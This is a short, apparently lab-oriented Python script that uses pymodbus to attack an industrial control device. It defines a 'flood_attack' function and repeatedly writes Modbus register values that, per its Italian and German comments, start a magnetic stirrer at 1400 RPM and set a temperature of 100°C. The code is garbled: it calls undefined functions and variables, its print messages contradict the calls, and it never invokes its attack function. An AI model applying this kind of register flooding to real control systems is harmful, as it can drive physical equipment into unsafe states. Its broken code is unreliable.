from pymodbus.client import AsyncModbusTcpClient
import asyncio
async def flood_attack():
    
    # Crea il client Modbus asincrono
    client = AsyncModbusTcpClient("localhost", port=503, trace_packet=packet_logger)

    # Connetti il client
    await client.connect()

    # Leggi i dati dallo slave 1
    print("Writing coils")
    await read_slave_data(client, slave_id=1)
    print("Slave 1 Data:", slave_1_data)

    # Leggi i dati dallo slave 2
    print("Reading data from Slave 2...")
    slave_2_data = await read_slave_data(client, slave_id=2)
    print("Slave 2 Data:", slave_2_data)


if __name__ == '__main__':
    # Modbus Server IP finden
    modbus_ip = "localhost"

    # Für 10 Sekunden beginnend ab dem ersten Register, die Werte 1, 1400 und 100 setzen
    # (Magnetrührer starten, 1400 RPM und Temperatur auf 100°C stellen)
    spam_modbus_register_values(modbus_ip=modbus_ip, seconds=10, register=0, register_values=[1, 1400, 100])

    # Für 5 Sekunden auf dem ersten Register den Wert 0 setzen
    # (Magnetrührer stoppen)
    spam_modbus_register_values(modbus_ip=modbus_ip, seconds=1, register=0, register_values=[0])